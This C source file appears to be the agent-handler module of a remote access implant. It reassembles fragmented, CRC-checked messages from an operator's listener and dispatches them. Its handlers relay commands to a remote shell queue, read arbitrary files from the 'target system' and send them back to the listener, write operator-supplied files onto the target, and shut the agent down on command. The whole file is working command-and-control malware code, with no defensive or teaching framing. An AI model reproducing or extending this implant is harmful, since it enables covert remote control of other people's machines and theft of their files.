#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <signal.h>
#include <zconf.h>

#include <arpa/inet.h>

#include "crc32.h"

#include "queue.h"
#include "implant.h"
#include "utility.h"
#include "agent_handler.h"

// Globals
extern Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
extern Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;
extern Queue* shell_receive_queue;
extern pthread_mutex_t shell_receive_queue_lock;
extern Queue* shell_send_queue;
extern pthread_mutex_t shell_send_queue_lock;
// SIGINT flags
extern volatile sig_atomic_t agent_close_flag;
// Connected flag
extern volatile sig_atomic_t agent_disconnect_flag;


/* agent_handle_command
Send command to shell handler

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

RETURN
	RET_FATAL_ERROR		- cannot allocate memory
	RET_OK

DONE */
static int agent_handle_command(Assembled_Message* a_message){
	Queue_Message* message;
	
	if ((message = calloc(1, sizeof(Queue_Message))) == NULL) return RET_FATAL_ERROR;
	
	message->size = a_message->last_header.total_size;
	message->buffer = a_message->message;
	a_message->message = NULL;
	
	pthread_mutex_lock(&shell_send_queue_lock);
	enqueue(shell_send_queue, message);
	pthread_mutex_unlock(&shell_send_queue_lock);

	return RET_OK;
}

/* agent_handle_get_file_name
Read a file from the target system and send the file name and contents to the
listener. 

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

RETURN
	RET_ERROR			- cannot access or read file
	RET_FATAL_ERROR		- cannot allocate memory
	RET_OK

DONE */
static int agent_handle_get_file_name(Assembled_Message* a_message){
	int retval = RET_OK;
	FILE* file_fd;
	int file_size, bytes_read, file_name_size;
	char *file_buffer, *file_name_buffer, *slash_ptr;
	const char slash = '/';

	if (access(a_message->message, F_OK)){
		debug_print("%s\n", "get file that doesn't exist");
		agent_prepare_response(STATUS_FILE_EXIST);
		retval = RET_ERROR;
		goto done;
	}

	if ((file_fd = fopen(a_message->message, "rb")) == 0){
		debug_print("could not open file: %s\n", a_message->message);
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done;
	}

	if (fseek(file_fd, 0L, SEEK_END) == -1){
		debug_print("%s\n", "fseek error");
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done_fp;
	}
	if ((file_size = ftell(file_fd)) == -1){
		debug_print("%s\n", "ftell error");
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done_fp;
	}
	rewind(file_fd);

	if ((file_buffer = malloc(file_size)) == NULL){
		retval = RET_FATAL_ERROR;
		goto done_fp;
	}

	bytes_read = fread(file_buffer, 1, file_size, file_fd);
	if (bytes_read != file_size || ferror(file_fd)){
		debug_print("%s\n", "fread error");
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done_file_buf;
	}

	// remove path from file name when sending to listener
	if ((slash_ptr = strrchr(a_message->message, slash)) == NULL){
		debug_print("Get file: %s, size: %d\n", a_message->message, file_size);
		agent_prepare_message(TYPE_GET_FILE_NAME, a_message->message, a_message->current_message_size);
	}
	else{
		// start at next character after last forward slash
		slash_ptr++;
		file_name_size = strlen(slash_ptr);
		if ((file_name_buffer = calloc(1, file_name_size + 1)) == NULL){
			retval = RET_FATAL_ERROR;
			goto done_file_buf;
		}
		memcpy(file_name_buffer, slash_ptr, file_name_size);

		debug_print("Get file: %s, size: %d\n", file_name_buffer, file_size);
		agent_prepare_message(TYPE_GET_FILE_NAME, file_name_buffer, file_name_size + 1);
		free(file_name_buffer);
		a_message = NULL;
	}

	agent_prepare_message(TYPE_GET_FILE, file_buffer, file_size);

done_file_buf:
	free(file_buffer);
done_fp:
	fclose(file_fd);
done:
	return retval;
}

/* agent_handle_put_file_name
Copy file name to a_message->file_name.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

DONE */
static void agent_handle_put_file_name(Assembled_Message* a_message){

	if (a_message->file_name != NULL) free(a_message->file_name);

	a_message->file_name = a_message->message;
	a_message->message = NULL;

	debug_print("Put file name: %s\n", a_message->file_name);
}

/* agent_handle_put_file
Copy file contents to target.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

RETURN
	RET_ERROR	- a_message->file_name is not set, cannot access fule, or write
					error
	RET_OK

DONE */
static int agent_handle_put_file(Assembled_Message* a_message){
	int retval = RET_OK;
	FILE* file_fd;

	if (check_directory(a_message->file_name, a_message->last_header.total_size) != RET_OK){
		debug_print("%s\n", "directory does not exist");
		agent_prepare_response(STATUS_PATH_EXIST);
		retval = RET_ERROR;
		goto done;
	}

	if (a_message->file_name == NULL){
		debug_print("%s\n", "file name not set");
		agent_prepare_response(STATUS_MESSAGE_ORDER);
		retval = RET_ERROR;
		goto done;
	}

	if ((file_fd = fopen(a_message->file_name, "wb")) == 0){
		debug_print("could not open file: %s\n", a_message->file_name);
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done;
	}

	if (writeall(file_fd, a_message->message, a_message->last_header.total_size) != RET_OK){
		debug_print("%s\n", "error writing file");
		agent_prepare_response(STATUS_FILE_ACCESS);
		retval = RET_ERROR;
		goto done_fp;
	}

	debug_print("Put file: %s, size: %d\n", a_message->file_name, a_message->last_header.total_size);
	agent_prepare_response(STATUS_FILE_PUT);

done_fp:
	fclose(file_fd);
done:
	free(a_message->file_name);
	a_message->file_name = NULL;
	return retval;
}

/* agent_parse_first_fragment
If this is the first fragment of a multi fragment message, check if the order
is correct and initiate a_message fields.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments
	fragment	- the fragment we are handling at this time
	size		- size of fragment

RETURN
	RET_ERROR 			- fragments received out of order
	RET_FATAL_ERROR		- cannot allocate memory
	RET_OK

DONE */
static int agent_parse_first_fragment(Assembled_Message* a_message, Fragment* fragment, int size){

	// check if this is a first fragment
	if (fragment->header.index != 0){
		debug_print("Expected first fragment but got: %d\n", fragment->header.index);
		agent_prepare_response(STATUS_MESSAGE_ORDER);
		return RET_ERROR;
	}

	// check if this fragment contains no data
	if (size != HEADER_SIZE){
		debug_print("Expected first fragment size 0 but got: %d\n", size);
		agent_prepare_response(STATUS_MESSAGE_ORDER);
		return RET_ERROR;
	}

	debug_print("Handling first fragment: type: %d\n", fragment->header.type);

	// save fragment to agent struct
	memcpy(&a_message->last_header, fragment, HEADER_SIZE);
	
	// allocate memory for total message
	if (a_message->message != NULL) free(a_message->message);
	if ((a_message->message = calloc(1, fragment->header.total_size)) == NULL) return RET_FATAL_ERROR;

	// record current size of message
	a_message->current_message_size = 0;

	return RET_OK;
}

/* agent_parse_next_fragment
If this is not the next fragment of a multi fragment message, check if the
order is correct, update a_message fields, and copy fragment to message
buffer.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments
	fragment	- the fragment we are handling at this time
	size		- size of fragment

RETURN
	RET_ERROR 	- fragments received out of order
	RET_OK

DONE */
static int agent_parse_next_fragment(Assembled_Message* a_message, Fragment* fragment, int size){

	// check if this fragment matches the next expected sized
	if (size - HEADER_SIZE != a_message->last_header.next_size){
		debug_print("Expected fragment size: %d, but got: %d\n", size - HEADER_SIZE, a_message->last_header.next_size);
		agent_prepare_response(STATUS_MESSAGE_ORDER);
		return RET_ERROR;
	}

	// check if type, checksum, and index match
	if (fragment->header.type != a_message->last_header.type || \
		fragment->header.checksum != a_message->last_header.checksum || \
		fragment->header.index != a_message->last_header.index + 1){
		debug_print("Unexpected fragment: type: %d, checksum: %d, index: %d\n", \
			fragment->header.type, \
			fragment->header.checksum, \
			fragment->header.index);
		agent_prepare_response(STATUS_MESSAGE_ORDER);
		return RET_ERROR;
	}
	
	// copy payload to end of message buffer
	memcpy(a_message->message + a_message->current_message_size, \
			fragment->buffer, \
			a_message->last_header.next_size);
	
	// update current size of message
	a_message->current_message_size += a_message->last_header.next_size;

	// update agent's last header
	memcpy(&a_message->last_header, fragment, HEADER_SIZE);

	return RET_OK;
}

/* agent_handle_message_fragment
Determine if we need to parse first fragment or a follow up fragment.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments
	q_message	- message from receive queue

DONE */
static int agent_handle_message_fragment(Assembled_Message* a_message, Queue_Message* q_message){
	int retval = RET_OK;

	// handle message type other than keep alive
	if (a_message->last_header.index == -1){
		retval = agent_parse_first_fragment(a_message, q_message->fragment, q_message->size);
	}
	else{
		retval = agent_parse_next_fragment(a_message, q_message->fragment, q_message->size);
	}

	return retval;
}

/* agent_handle_complete_message
Once all fragments are received, check crc and pass message to proper message
handler.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

RETURN
	RET_ERROR	- crc doesn't match or unknown message type received
	RET_OK

DONE */
static int agent_handle_complete_message(Assembled_Message* a_message){
	int retval = RET_OK;
	uint32_t crc;

	// check if checksum matches message
	if ((crc = calculate_crc32c(0, (unsigned char*)a_message->message, a_message->last_header.total_size)) != a_message->last_header.checksum){
		debug_print("%s\n", "CRCs don't match");
		agent_prepare_response(STATUS_BAD_CRC);
		return RET_ERROR;
	}

	switch(a_message->last_header.type){
		case TYPE_COMMAND:
			retval = agent_handle_command(a_message);
			break;
		case TYPE_GET_FILE_NAME:
			retval = agent_handle_get_file_name(a_message);
			break;
		case TYPE_PUT_FILE_NAME:
			agent_handle_put_file_name(a_message);
			break;
		case TYPE_PUT_FILE:
			retval = agent_handle_put_file(a_message);
			break;
		case TYPE_CLOSE_AGENT:
			debug_print("%s\n", "TYPE_CLOSE_AGENT");
			agent_close_flag = true;
			break;
		default:
			debug_print("unknown message type: %d\n", a_message->last_header.type);
			agent_prepare_response(STATUS_UNKNOWN_MESSAGE);
			retval = RET_ERROR;
	}

	return retval;
}

/* agent_handle_message
Dequeue fragment from receive queue and handle the fragment. If this is the
last fragment in the complete message, handle the complete message.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

DONE */
static int agent_handle_message(Assembled_Message* a_message){
	int retval = RET_OK;
	Queue_Message* q_message;

	pthread_mutex_lock(&agent_receive_queue_lock);
	q_message = dequeue(agent_receive_queue);
	pthread_mutex_unlock(&agent_receive_queue_lock);

	if (!q_message) return RET_OK;
	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);

	// check response from fragment handler
	if ((retval = agent_handle_message_fragment(a_message, q_message)) != RET_OK){
		if (a_message->message != NULL){
			free(a_message->message);
			a_message->message = NULL;
		}
		if (a_message->file_name != NULL){
			free(a_message->file_name);
			a_message->file_name = NULL;
		}
		a_message->last_header.index = -1;
		goto done;
	}
	
	// check if we received all fragments and handle completed message
	if (a_message->last_header.index != -1 && a_message->last_header.total_size == a_message->current_message_size){
		retval = agent_handle_complete_message(a_message);
		if (a_message->message != NULL){
			free(a_message->message);
			a_message->message = NULL;
		}
		a_message->last_header.index = -1;
	}

done:
	free(q_message->fragment);
	free(q_message);
	return retval;
}

/* agent_prepare_response
Prepare to send a response message out over the socket.

ARGUMENTS
	id	- the response id

DONE */
int agent_prepare_response(int id){
	Queue_Message* q_message;
	Fragment* fragment;

	// prepare first fragment. Only purpose is to prepare for next fragment size
	if ((fragment = calloc(1, sizeof(Fragment))) == NULL) return RET_FATAL_ERROR;
	fragment->header.type = TYPE_RESPONSE;
	fragment->header.response_id = id;
	
	if ((q_message = malloc(sizeof(Queue_Message))) == NULL) return RET_FATAL_ERROR;
	q_message->id = 0;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	pthread_mutex_lock(&agent_send_queue_lock);
	enqueue(agent_send_queue, q_message);
	pthread_mutex_unlock(&agent_send_queue_lock);

	return RET_OK;
}

/* agent_prepare_message
break the message into fragments and enqueue them to send out over the socket.
The first message will always be 0 bytes to indicate the next read size.

ARGUMENTS
	type		- the message type that is being sent
	message		- the message content
	m_size		- size of message in bytes

HALFDONE */
int agent_prepare_message(int type, char* message, int m_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0, index = 0;
	int this_size, next_size;
	uint32_t crc = calculate_crc32c(0, (unsigned char*)message, m_size);

	// prepare first fragment. Only purpose is to prepare for next fragment size
	if ((fragment = calloc(1, sizeof(Fragment))) == NULL) return RET_FATAL_ERROR;
	fragment->header.type = type;
	fragment->header.index = index++;
	fragment->header.total_size = m_size;
	fragment->header.checksum = crc;
	
	next_size = m_size < PAYLOAD_SIZE ? m_size : PAYLOAD_SIZE;
	fragment->header.next_size = next_size;
	
	if ((q_message = malloc(sizeof(Queue_Message))) == NULL) return RET_FATAL_ERROR;
	q_message->id = 0;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	pthread_mutex_lock(&agent_send_queue_lock);
	enqueue(agent_send_queue, q_message);

	while (next_size > 0){
		this_size = next_size;

		// send remaining fragments
		if ((fragment = calloc(1, sizeof(Fragment))) == NULL) return RET_FATAL_ERROR;
		fragment->header.type = type;
		fragment->header.index = index++;
		fragment->header.total_size = m_size;
		fragment->header.checksum = crc;

		next_size = (m_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (m_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
		fragment->header.next_size = next_size;
		memcpy(fragment->buffer, message + bytes_sent, this_size);
		
		if ((q_message = malloc(sizeof(Queue_Message))) == NULL) return RET_FATAL_ERROR;
		q_message->id = 0;
		q_message->size = HEADER_SIZE + this_size;
		q_message->fragment = fragment;

		enqueue(agent_send_queue, q_message);
		bytes_sent += this_size;
	}

	pthread_mutex_unlock(&agent_send_queue_lock);
	return RET_OK;
}

/* agent_handler_thread
Thread main for agent handler. This function will create the Assembled_Message
object to track all messages coming to the agent. It will continuously loop
and pull messages off the receive queue for processing. Only stop if the
agent is shutting down or going dormant.

ARGUMENTS
	vargp	- void

DONE */
void *agent_handler_thread(void *vargp){
	Assembled_Message assembled_message = {0};
	assembled_message.last_header.index = -1;

	debug_print("%s\n", "starting agent handler thread");

	while(!agent_close_flag && !agent_disconnect_flag){
		if (agent_handle_message(&assembled_message) == RET_FATAL_ERROR){
			printf("agent_handler_thread error\n");
			agent_prepare_response(STATUS_ERROR);			// Not sure if this will send before threads shutdown. Decide later if going to keep or remove.
			agent_close_flag = true;
		}
	}

	debug_print("%s\n", "agent_handler_thread done");
	return 0;
}